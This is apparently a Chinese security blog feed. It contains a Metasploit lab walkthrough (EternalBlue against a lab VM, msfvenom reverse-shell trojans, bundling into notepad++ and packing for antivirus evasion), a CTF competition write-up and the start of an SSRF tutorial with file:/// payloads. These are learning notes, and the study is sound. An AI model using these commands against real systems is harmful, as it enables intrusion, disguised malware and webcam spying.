    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>msf(metasploit framework)是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。</p><p>kali控制台输入msfconsole即可进入msf</p><p>msf使用法则：</p><ol><li>使用模块(use)</li><li>配置模块必选项(set)</li><li>运行模块(run)</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091313778.png" alt="image-20211209131307626"></p><h2 id="永恒之蓝利用"><a href="#永恒之蓝利用" class="headerlink" title="永恒之蓝利用"></a>永恒之蓝利用</h2><p>微软会把每年的漏洞按序号排序，比如永恒之蓝的漏洞代号为<strong>ms17_010</strong>(表示Microsoft 2017年的第十个漏洞)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole         //进入metasploit</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17_010    //查看漏洞信息</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091330903.png" alt="image-20211209133016641"></p><h3 id="1-使用模块"><a href="#1-使用模块" class="headerlink" title="1.使用模块"></a>1.使用模块</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091331081.png" alt="image-20211209133137982"></p><p>没有配置payload的值，默认使用windows/x64/meterpreter/reverse_tcp，如果默认不是这个，我们可以自己设置(set payload windows/x64/meterpreter/reverse_tcp)</p><h3 id="2-配置必选项"><a href="#2-配置必选项" class="headerlink" title="2.配置必选项"></a>2.配置必选项</h3><p>先查看配置项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091334790.png" alt="image-20211209133418508"></p><p>这里要设置我们要攻击的主机(RHOSTS)，永恒之蓝的远程攻击端口为445，下面的LHOST是我们的kali主机的ip，LPORT为监听端口(可以自定义修改，1~65535端口，只要没有端口冲突就行)</p><blockquote><p>exploit:漏洞攻击脚本(比如火箭)</p><p>payload:攻击载荷(火箭上的卫星，起实际作用的部分)</p></blockquote><p>查看win7的ip为：192.168.29.140</p><p>则我们在kali的msf6命令行中输入(能一次性set，比如set RHOSTS=192.168.29.140 LPORT=10000)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.29.140</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 10000</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091345935.png" alt="image-20211209134501524"></p><h3 id="3-运行模块"><a href="#3-运行模块" class="headerlink" title="3.运行模块"></a>3.运行模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091346176.png" alt="image-20211209134659007"></p><p>已经得到了win7的控制</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091351905.png" alt="image-20211209135151799"></p><p>这里我们可以输入shell进入cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091501782.png" alt="image-20211209150157592"></p><p>exit 退出，而且攻击是实时的 如果对方关机了就不行了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091408205.png" alt="image-20211209140802143"></p><h2 id="生成后门msfvenom"><a href="#生成后门msfvenom" class="headerlink" title="生成后门msfvenom"></a>生成后门msfvenom</h2><p>这个没有利用漏洞，而是利用木马后门</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091422484.png" alt="image-20211209142238181"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o /root/demo.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091427877.png" alt="image-20211209142716737"></p><p>然后目录下可以找到demo.exe这个文件</p><p>然后我们继续在kali使用模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; show options  //查看配置必选项</span><br><span class="line">msf6 exploit(multi/handler)&gt; set lhost 192.168.29.137   //设置kali主机的ip</span><br><span class="line">msf6 exploit(multi/handler)&gt; set lport 10000            //设置监听端口</span><br><span class="line">msf6 exploit(multi/handler)&gt; run      //开始监听，等待...</span><br></pre></td></tr></table></figure><p>然后把demo.exe文件复制给win7，并且win7运行</p><p>然后发现报错了…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091440949.png" alt="image-20211209144045870"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091441120.png" alt="image-20211209144101008"></p><p>看了下sessions，发现本地主机和远程主机的ip与端口都没毛病…</p><p>然后再show options，发现</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091439003.png" alt="image-20211209143948836"></p><p>这个payload和前面创建demo.exe设置的payload不是同一个(<a href="https://blog.csdn.net/zhang35/article/details/105675341">解决方法</a>)，所以我们需要：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091443593.png" alt="image-20211209144313365"></p><p>连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091526505.png" alt="image-20211209152636124"></p><p>…攻击了我的物理机，监听了我的摄像头….</p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>所以生成远程木马后门的主要流程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o /root/demo.exe</span><br><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options  //查看配置必选项</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ip</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口</span><br><span class="line">msf6 exploit(multi/handler) &gt; run      //开始监听，等待...</span><br></pre></td></tr></table></figure><hr><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><h3 id="捆绑其它软件exe"><a href="#捆绑其它软件exe" class="headerlink" title="捆绑其它软件exe"></a>捆绑其它软件exe</h3><p>下载一个软件比如notepad++，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -x notepad++.exe -f exe -o demo01.exe</span><br></pre></td></tr></table></figure><p>主要是-x参数，这里把demo01.exe捆绑在notepad++.exe上了，然后保存在root目录下，名字为demo01.exe且看起来是notepad++的图标</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091556127.png" alt="image-20211209155657005"></p><p>然后一通设置之后…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options  //查看配置必选项</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ip</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口</span><br><span class="line">msf6 exploit(multi/handler) &gt; run      //开始监听，等待...</span><br></pre></td></tr></table></figure><p>然后打开了win10自带的病毒查杀，但是没有查到威胁…</p><p>然后运行了一遍，发现控制不了靶机…一度怀疑我的metasploit或者端口号出现了问题，但是换了个端口还是不行，然后我再用之前实验(demo.exe)控制发现可以…就免杀的exe控制不了，所以估计是这个免杀方法用不了，而且如果杀毒软件是火绒的话是会被杀掉的</p><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o demo01.exe</span><br><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options  //查看配置必选项</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ip</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口</span><br><span class="line">msf6 exploit(multi/handler) &gt; run      //开始监听，等待...</span><br></pre></td></tr></table></figure><p>加壳有压缩壳和加密壳，加壳是为了不让软件被别人反编译然后抄袭。kali中有upx可以进行脱壳和加壳，然后我先用的kali中的upx工具来把demo01.exe加壳…但是我加壳之后还是被杀了…</p><p>之后下载了Themida(<a href="https://www.52pojie.cn/thread-1217750-1-1.html">Themida下载链接</a>)，把demo01.exe从kali拖出来，然后再拖进脱壳32位软件的Themida</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091941194.png" alt="image-20211209194101010"></p><p>然后会生成一个demo01_protected.exe的文件，这个就是加壳的demo01.exe。加密后重新打开win10自带的病毒防护，病毒查到了demo01.exe是木马，但是没有查到demo01_protected.exe，说明加壳确实是<strong>可以绕过病毒防护和某些杀毒软件</strong>的(即将打脸)</p><p>然后双击demo01_protected.exe</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092002752.png" alt="image-20211209200248681"></p><p>虽然连得上，但是当你输入命令的时候，win10的病毒防护还是会弹出病毒提示</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091955422.png" alt="image-20211209195513306"></p><p>目测是因为你输入的命令在win10后台运行的时候被检测到并且定位到可执行文件并隔离(删除)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092001827.png" alt="image-20211209200134764"></p><p>妈呀…真是打脸哈哈哈哈。但是好像这个方法确实可以过腾讯管家和火绒，但是过不了360和win10的病毒防护</p><h2 id="想要获取hash值"><a href="#想要获取hash值" class="headerlink" title="想要获取hash值"></a>想要获取hash值</h2><p>当我在meterpreter控制台中输入hashdump的时候，meterpreter提示我</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrectpriv_passwd_get_sam_hashes:操作失败：参数不正确</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092150708.png" alt="image-20211209215054601"></p><p>getsystem也提示我全身不足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid         //获取当前用户名称</span><br></pre></td></tr></table></figure><p>好像确实是普通用户诶…当我根据<a href="https://hackergu.com/metasploit-%E6%9D%83%E9%99%90%E4%B8%8Ehashdump%E4%B9%8B%E9%97%B4%E7%9A%84%E8%AE%A4%E8%AF%86/">这篇文章</a>尝试使用exp绕过win10的UAC之后，又提示我</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)SESSION 可能与此模块不兼容（缺少 Meterpreter 功能：stdapi_sys_process_set</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092157089.png" alt="image-20211209215755958"></p><p>淦…已经晚上十点了…我还是回宿舍洗个澡有空再研究吧</p>]]></content>
    
    
    <summary type="html">Metasploit的简单使用</summary>
    
    
    
    <category term="Kali" scheme="https://jason177.com/categories/Kali/"/>
    
    
    <category term="Metasploit" scheme="https://jason177.com/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>2021年黑盾杯wp</title>
    <link href="https://jason177.com/2021/12/03/hdb2021/"/>
    <id>https://jason177.com/2021/12/03/hdb2021/</id>
    <published>2021-12-03T05:20:50.000Z</published>
    <updated>2021-12-03T08:17:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>二轮游了，拿了个优秀奖…不过第一次参加CTF省赛，也算是超过预期了吧，一开始是没想到能过初赛进入到复赛，和各高校的大佬比起来进决赛想必也是只有被吊打的份…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031352342.png" alt="image-20211203135249754"></p><p>希望以后还能有更多机会参加更多的比赛锻炼锻炼自己吧。写一下赛后wp记录一下吧</p><blockquote><p><strong>菜狗就做了DNS协议分析和日志分析这两题，其它都是队友做的，哭唧唧</strong></p></blockquote><hr><h1 id="DNS协议分析"><a href="#DNS协议分析" class="headerlink" title="DNS协议分析"></a>DNS协议分析</h1><p>解压DNS协议分析zip压缩包，得到一个pcapng后缀的文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031358371.png" alt="image-20211203135827300"></p><p>用wireshark打开，并且根据题意，过滤出dns协议的数据</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031359950.png" alt="image-20211203135912873"></p><p>可以看到在info字段，有疑似base64编码的痕迹</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031402444.png" alt="image-20211203140206375"></p><p>这时候先解码前四个字符，解出fla</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031402994.png" alt="image-20211203140242915"></p><p>大概率是flag被base64编码之后分解成很多段了</p><p>将所有疑似 base64 编码后的字符串找出</p><p><strong>ZmxhZ3tlNj</strong>.i6ov08.dnslog.cn</p><p><strong>YyYWMxNTRj</strong>.i6ov08.dnslog.cn</p><p><strong>YTM3NmUxYz</strong>.i6ov08.dnslog.cn</p><p><strong>AwMWVlOGJi</strong>.i6ov08.dnslog.cn</p><p><strong>ZTgxMzE4Yn0K</strong>.i6ov08.dnslog.cn</p><p>将其拼接在一起，得到<strong>ZmxhZ3tlNjYyYWMxNTRjYTM3NmUxYzAwMWVlOGJiZTgxMzE4Yn0K</strong></p><p>进行base64解码可得flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031405591.png" alt="image-20211203140513531"></p><hr><h1 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h1><p>解开压缩文件，得到名为 access.log 的日志文件，将其打开</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031406614.png" alt="image-20211203140605535"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031406879.png" alt="image-20211203140612821"></p><p>看到很多url编码，先用notepad++自带的MIME Tools中的url Decode解码来把整个文本解码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031406807.png" alt="image-20211203140637744"></p><p>根据题目描述，需要得到黑客拿到的管理员密码，所以直接ctrl+F查找password字段</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031406964.png" alt="image-20211203140652887"></p><p>可以看出来是盲注，通过比较password中每个字符的ascii码大小得到对应的字符，再根据后面返回的数据长度，长度678是判断错误，675是判断正确</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031407194.png" alt="image-20211203140708109"></p><p>将其中正确的数值根据ascii表转为字符，即为管理员密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031407693.png" alt="image-20211203140742621"></p><p>Flag 即为 ngjfdsUbdK</p><hr><h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p>本来以为是一道简单的签到题。。。</p><p>看到只有0和1，能想到的其实有二进制、培根密码、摩根密码、二维码等…但是数量这么庞大，二维码的概率更大一点</p><p>25w个字符，刚好是500×500的图片，一个字符代表一个像素。用脚本来把0和1变成二维码图像，需要用到python的PIL库，这里附上大佬(<a href="http://xumijiezi.xyz/">大佬的博客</a>)的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./ddd.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.readline()               //获取行内容</span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;1&quot;</span>:               //如果为<span class="number">1</span>，把<span class="number">255</span>加入列表中</span><br><span class="line">            d.append(<span class="number">255</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            d.append(<span class="number">0</span>)            //如果为<span class="number">0</span>，把<span class="number">0</span>加入列表中</span><br><span class="line">    g = np.array(d).reshape(<span class="number">500</span>, <span class="number">500</span>)       //列表转换成数组，并且设置<span class="number">500</span>行，<span class="number">500</span>列的形状</span><br><span class="line">    Image.fromarray(g).convert(<span class="string">&#x27;L&#x27;</span>).save(<span class="string">&#x27;./signin.png&#x27;</span>)      //用<span class="string">&#x27;L&#x27;</span>模式，把数组转换成图片保存为signin.png</span><br></pre></td></tr></table></figure><blockquote><p>‘L’模式为灰度图像，每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。PIL中一共有九种模式</p></blockquote><p>得到缺少一个定位符的二维码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051506849.png" alt="image-20211205150604683"></p><p>放入QR Research即可得到二维码的内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051508241.png" alt="image-20211205150808125"></p><p>拿到flag</p><hr><h1 id="Modbus的秘密"><a href="#Modbus的秘密" class="headerlink" title="Modbus的秘密"></a>Modbus的秘密</h1><p>题目描述 flag在最长的modbus流里面，过滤一下modbus协议然后排序一下就可以在最长的数据流中看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051512546.png" alt="image-20211205151205479"></p><hr><h1 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h1><p>这题我还没看懂。。。看懂了再记录吧</p><h1 id="在线电力控制系统消息传送"><a href="#在线电力控制系统消息传送" class="headerlink" title="在线电力控制系统消息传送"></a>在线电力控制系统消息传送</h1><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051516925.png" alt="image-20211205151636819"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051517610.png" alt="image-20211205151726549"></p><p>随意输入网址，页面出现提示要求必须包含 dianli.com，而且通过burpsuite拦截包的话可以发现是post了一个url参数</p><p>根据题目提示，应该需要绕过 parse_url 函数，使用 // 可以实现绕过</p><p>当我尝试了伪协议file之后，或者输入路径var时，会提示”Hacker!!”，所以应该是把file伪协议和linux一些目录名给过滤掉了，那只能使用相对路径(目录穿越)，如果路径输入错误的话会提示”No such file or directory in …”，所以更加确定flag是藏在其它路径下</p><p>比赛的时候不敢用dirsearch去扫描web目录…所以这个只能盲猜路径和flag文件名…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051522130.png" alt="image-20211205152210060"></p><p>拿到flag</p><hr><h1 id="Master-Of-VM"><a href="#Master-Of-VM" class="headerlink" title="Master Of VM"></a>Master Of VM</h1><p>根据题目信息(给了ip、端口、账号和密码)，使用ssh连接靶机</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051525491.png" alt="image-20211205152535432"></p><p>使用 ls 命令查看当前目录内容，发现有 flag 文件。使用 cat 命令查看 flag 文件，发现没有权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051525507.png" alt="image-20211205152550450"></p><p>继续浏览，在根目录发现 flag.txt 文件，使用 cat 命令查看</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051526789.png" alt="image-20211205152615731"></p><p>得到 flag</p>]]></content>
    
    
    <summary type="html">2021年黑盾杯复赛一些题目的wp</summary>
    
    
    
    <category term="CTF比赛" scheme="https://jason177.com/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
    <category term="http" scheme="https://jason177.com/tags/http/"/>
    
    <category term="SSRF" scheme="https://jason177.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-SSRF</title>
    <link href="https://jason177.com/2021/11/17/ssrf/"/>
    <id>https://jason177.com/2021/11/17/ssrf/</id>
    <published>2021-11-17T11:08:04.000Z</published>
    <updated>2021-11-18T08:17:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-SSRF"><a href="#CTFHub-SSRF" class="headerlink" title="CTFHub-SSRF"></a>CTFHub-SSRF</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;SSRF</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p><a href="https://www.bilibili.com/read/cv12733096">相关链接</a></p><blockquote><p><strong>SSRF</strong>(Server-side Request Forge, 服务端请求伪造)：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务，类型可分为有回显和无回显两种。</p></blockquote><blockquote><p><strong>例子</strong>：攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。<strong>其实意思就是利用服务器A来对内部网络中的系统B发起请求。</strong><a href="https://www.freebuf.com/articles/web/258365.html">相关链接</a></p></blockquote><blockquote><p><strong>漏洞产生原因</strong>：服务端提供从其他服务器应用获取数据的功能，却没有对地址和协议做过滤，导致可利用此功能攻击服务端本机或所在内网。</p></blockquote><blockquote><p><strong>漏洞危害</strong>：探测内网信息、攻击内网应用</p></blockquote><blockquote><p><strong>常见场景</strong>：云服务商操作数据库、远程图片加载、网站采集抓取、头像、让你输入网址和ip的地方、webmail收发其他邮箱邮件、转码服务、在线翻译、收藏功能等。</p></blockquote><blockquote><p><strong>漏洞利用常用协议</strong>：file、http(s)、dict、gopher</p></blockquote><p>所以在做题目之前我们需要先<strong>简单了解</strong>在SSRF当中最常使用的四种URL伪协议，然后我们通过做题来理解怎么使用。</p><h2 id="四种URL伪协议"><a href="#四种URL伪协议" class="headerlink" title="四种URL伪协议"></a>四种URL伪协议</h2><p><a href="https://zhuanlan.zhihu.com/p/115222529">相关链接</a></p><h3 id="file"><a href="#file" class="headerlink" title="file:///"></a>file:///</h3><p>该伪协议可以从文件系统中获取文件，file协议的格式为：file:///文件路径</p><h3 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h3><p>词典网络协议。通过dict协议，可以探测端口的开放情况和指纹信息。dict协议的格式为：dict://ip地址:port端口</p><h3 id="http-s"><a href="#http-s" class="headerlink" title="http(s)://"></a>http(s)://</h3><p>这个协议其实非常常见，一般加在url前面的，向目标发送http请求。</p><div class="note green icon simple"><i class="note-icon fas fa-thumbs-up"></i><p><strong>file协议和http协议的区别：</strong></p><ul><li>file协议主要用于读取服务器本地文件，访问的是本地的静态资源</li><li>http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析</li><li>http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</li><li>file对应的类似http的协议是ftp协议（文件传输协议）</li><li>file不能跨域</li></ul></div><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引。需要发送多行数据时，就要用到gopher协议。gopher协议使用限制如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172051862.png" alt="image-20211117205137796"></p><p><strong>gopher协议支持发出GET、POST请求</strong>：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p><strong>Gopher协议格式：</strong></p><p>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</p><p><strong>gopher的默认端口是70如果发起post请求，回车换行需要使用%0d%0a</strong>，如果多个参数，参数之间的&amp;也需要进行URL编码</p><p><strong>所以总的来说，gopher可以构造很多种不同类型的请求</strong>，下面的题目会利用gopher构造post请求。</p><p>Gopher牛逼！！！</p><h2 id="CTFHub-SSRF系列wp"><a href="#CTFHub-SSRF系列wp" class="headerlink" title="CTFHub-SSRF系列wp"></a>CTFHub-SSRF系列wp</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>看到题目：内网访问。然后再看题目描述：尝试访问位于127.0.0.1的flag.php吧</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172006588.png" alt="image-20211117200640184"></p><p>然后我们开启题目，点击网址之后的url栏是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172008338.png" alt="image-20211117200853279"></p><p>这里有一个名为”url”的参数，既然题目说了127.0.0.1中有一个flag.php，那我们就把”url=”后面的”_”替换成”127.0.0.1/flag.php”,拿到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p>这题还蛮简单的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172010988.png" alt="image-20211117201040928"></p><p>如果想要更规范的表达，那就加个http</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181343298.png" alt="image-20211118134316693"></p><h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>题目：伪协议读取文件。题目描述：尝试去读取一下Web目录下的flag.php吧</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172018092.png" alt="image-20211117201855010"></p><p>由题可知，flag.php放在web的目录下，那默认apache的web目录路径为/var/www/html/</p><p>并且file伪协议可以从文件系统中获取文件，所以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172034893.png" alt="image-20211117203421808"></p><p>???</p><p>不慌，我们看一下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 